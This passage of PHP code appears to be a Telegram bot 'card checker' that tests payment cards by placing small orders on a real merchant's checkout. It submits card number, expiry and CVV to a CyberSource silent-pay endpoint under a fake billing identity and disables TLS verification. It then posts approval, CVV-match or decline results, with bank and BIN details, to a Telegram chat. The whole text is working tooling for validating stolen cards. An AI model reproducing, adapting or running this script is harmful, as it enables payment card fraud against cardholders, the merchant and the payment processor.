curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$CartID.'","paymentMethod":{"method":"chcybersource"},"email":"dawdwd@gmail.com","billingAddress":{"countryId":"US","regionId":"13","regionCode":"CO","region":"Colorado","street":["4813 Olive St"],"company":"","telephone":"","postcode":"80022","city":"Commerce City","firstname":"Som","lastname":"Knows","customAttributes":[{"attribute_code":"custom_field_1","value":""}],"saveInAddressBook":null}}');

$SetPaymentInformation = curl_exec($ch);
curl_close($ch);


# Load Silent Data

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.surveillance-video.com/cybersource/index/loadsilentdata');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /cybersource/index/loadsilentdata HTTP/2',
    'Host: www.surveillance-video.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.surveillance-video.com',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'form_key='.$Formkey.'&quoteEmail=dawdwd%40gmail.com&cardType='.$cbin.'');

$RandomData = json_decode($LoadSilentData = curl_exec($ch), true);

$Accesskey = $RandomData['form_data']['access_key'];
$IgnoreAVS = $RandomData['form_data']['ignore_avs'];
$IgnoreCVN = $RandomData['form_data']['ignore_cvn'];
$Profile = $RandomData['form_data']['profile_id'];
$TransactionUUID = $RandomData['form_data']['transaction_uuid'];
$UnsignedFieldNames = $RandomData['form_data']['unsigned_field_names'];
$SignedDateTime = $RandomData['form_data']['signed_date_time'];
$TransactionType = $RandomData['form_data']['transaction_type'];
$ReferenceNumber = $RandomData['form_data']['reference_number'];
$PaymentMethod = $RandomData['form_data']['payment_method'];
$PartnerSoln = $RandomData['form_data']['partner_solution_id'];
$CardTypes = $RandomData['form_data']['card_type'];
$MerchantSecureData1 = $RandomData['form_data']['merchant_secure_data1'];
$IPAddress = $RandomData['form_data']['customer_ip_address'];
$MerchantSecureData2 = $RandomData['form_data']['merchant_secure_data2'];
$Signature = $RandomData['form_data']['signature'];
curl_close($ch);


# Pay

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secureacceptance.cybersource.com/silent/pay');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /silent/pay HTTP/2',
    'Host: secureacceptance.cybersource.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.surveillance-video.com',
    'Connection: keep-alive',
    'Referer: https://www.surveillance-video.com/',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card_number='.$cc.'&card_expiry_date='.$mes.'-'.$ano.'&card_cvn='.$cvv.'&access_key='.$Accesskey.'&profile_id='.$Profile.'&ignore_avs='.$IgnoreAVS.'&ignore_cvn='.$IgnoreCVN.'&transaction_uuid='.$TransactionUUID.'&unsigned_field_names='.urlencode($UnsignedFieldNames).'&signed_date_time='.urlencode($SignedDateTime).'&locale=en-us&transaction_type='.$TransactionType.'&reference_number='.$ReferenceNumber.'&amount=9.74&currency=USD&payment_method='.$PaymentMethod.'&partner_solution_id='.$PartnerSoln.'&override_custom_receipt_page=https%3A%2F%2Fwww.surveillance-video.com%2Fcybersource%2Findex%2Fplaceorder%2F&payer_auth_enroll_service_run=true&tax_amount=0.00&card_type='.$CardTypes.'&card_type_selection_indicator=1&merchant_secure_data1='.$MerchantSecureData1.'&bill_to_forename=Som&bill_to_surname=Knows&bill_to_email=dawdwd%40gmail.com&bill_to_address_line1=4813+Olive+St&bill_to_address_city=Commerce+City&bill_to_address_postal_code=80022&bill_to_address_country=US&bill_to_address_state=CO&ship_to_forename=Som&ship_to_surname=Knows&ship_to_email=dawdwd%40gmail.com&ship_to_address_line1=4813+Olive+St&ship_to_address_city=Commerce+City&ship_to_address_postal_code=80022&ship_to_address_country=US&ship_to_country=US&ship_to_state=CO&ship_to_address_state=CO&merchant_defined_data23=web&customer_ip_address='.$IPAddress.'&merchant_defined_data31=flatrate_flatrate&merchant_defined_data32=Flat+Rate+-+Fixed&item_0_name=Linear+2400223+Washer+8+Flat&item_0_sku=2400-223&item_0_quantity=1&item_0_unit_price=0.25&item_0_tax_amount=0.00&item_0_code=simple&line_item_count=2&item_1_name=shipping&item_1_sku=shipping_and_handling&item_1_quantity=1&item_1_unit_price=9.49&item_1_code=shipping_and_handling&merchant_secure_data2='.urlencode($MerchantSecureData2).'&merchant_secure_data3=1&signed_field_names=access_key%2Cprofile_id%2Cignore_avs%2Cignore_cvn%2Ctransaction_uuid%2Cunsigned_field_names%2Csigned_date_time%2Clocale%2Ctransaction_type%2Creference_number%2Camount%2Ccurrency%2Cpayment_method%2Cpartner_solution_id%2Coverride_custom_receipt_page%2Cpayer_auth_enroll_service_run%2Ctax_amount%2Ccard_type%2Ccard_type_selection_indicator%2Cmerchant_secure_data1%2Cbill_to_forename%2Cbill_to_surname%2Cbill_to_email%2Cbill_to_address_line1%2Cbill_to_address_city%2Cbill_to_address_postal_code%2Cbill_to_address_country%2Cbill_to_address_state%2Cship_to_forename%2Cship_to_surname%2Cship_to_email%2Cship_to_address_line1%2Cship_to_address_city%2Cship_to_address_postal_code%2Cship_to_address_country%2Cship_to_country%2Cship_to_state%2Cship_to_address_state%2Cmerchant_defined_data23%2Ccustomer_ip_address%2Cmerchant_defined_data31%2Cmerchant_defined_data32%2Citem_0_name%2Citem_0_sku%2Citem_0_quantity%2Citem_0_unit_price%2Citem_0_tax_amount%2Citem_0_code%2Cline_item_count%2Citem_1_name%2Citem_1_sku%2Citem_1_quantity%2Citem_1_unit_price%2Citem_1_code%2Cmerchant_secure_data2%2Cmerchant_secure_data3%2Csigned_field_names&signature='.urlencode($Signature).'');

$CyberPay = curl_exec($ch);
$CVResult = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="auth_cv_result" id="auth_cv_result" value="','" />')));
$MerchantSecureData3 = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="req_merchant_secure_data3" id="req_merchant_secure_data3" value="','" />')));
$CardTypeIndicator = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="req_card_type_selection_indicator" id="req_card_type_selection_indicator" value="','" />')));
$CardTypeName = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="card_type_name" id="card_type_name" value="','" />')));
$AuthResponse = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="auth_response" id="auth_response" value="','" />')));
$ReturnCode = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="decision_early_return_code" id="decision_early_return_code" value="','" />')));
$TransactionID = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="transaction_id" id="transaction_id" value="','" />')));
$AVSCode = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="auth_avs_code" id="auth_avs_code" value="','" />')));
$CVVCode = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="auth_cv_result_raw" id="auth_cv_result_raw" value="','" />')));
$SignedDateTime2 = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="signed_date_time" id="signed_date_time" value="','" />')));
$Signature2 = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="signature" id="signature" value="','" />')));
$ReasonCode = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="reason_code" id="reason_code" value="','" />')));
$RequestToken = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="request_token" id="request_token" value="','" />')));
$AVSRaw = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="auth_avs_code_raw" id="auth_avs_code_raw" value="','" />')));
$Decision = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="decision" id="decision" value="','" />')));
$Message = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="message" id="message" value="We encountered a Vital problem:','" />')));
$SuccessMessage = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="message" id="message" value="','" />')));
$EarlyReasonCode = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="decision_early_reason_code" id="decision_early_reason_code" value="','" />')));
$EarlyDecision = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="decision_early_rcode" id="decision_early_rcode" value="','" />')));
$ItemCount = trim(strip_tags(GetStr($CyberPay, '<input type="hidden" name="req_line_item_count" id="req_line_item_count" value="','" />')));

$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);


$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);
curl_close($ch);



# Responses >

if($Decision == 'ACCEPT') {
sendMessage($chatId, '<b>CVV Matched - Approved! ($9.24)</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Cybersource%0A<b><u>Response:</u></b> '.$SuccessMessage.'%0A<b><u>CVV - AVS:</u></b> '.$CVVCode.' - '.$AVSCode.'%0A<b><u>Response Code:</u></b> '.$AuthResponse.'%0A<b><u>Decision:</u></b> '.$Decision.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
elseif (strpos($CyberPay, 'We encountered a Vital problem: Insufficient funds')) {
sendMessage($chatId, '<b>CVV Matched</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Cybersource%0A<b><u>Response:</u></b> Insufficient Funds%0A<b><u>CVV - AVS:</u></b> '.$CVVCode.' - '.$AVSCode.'%0A<b><u>Response Code:</u></b> '.$AuthResponse.'%0A<b><u>Decision:</u></b> '.$Decision.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>DECLINED</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Cybersource%0A<b><u>Response:</u></b> '.$Message.'%0A<b><u>CVV - AVS:</u></b> '.$CVVCode.' - '.$AVSCode.'%0A<b><u>Response Code:</u></b> '.$AuthResponse.'%0A<b><u>Decision:</u></b> '.$Decision.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}


curl_close($ch);
unlink('cookie.txt');

}



////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}





?>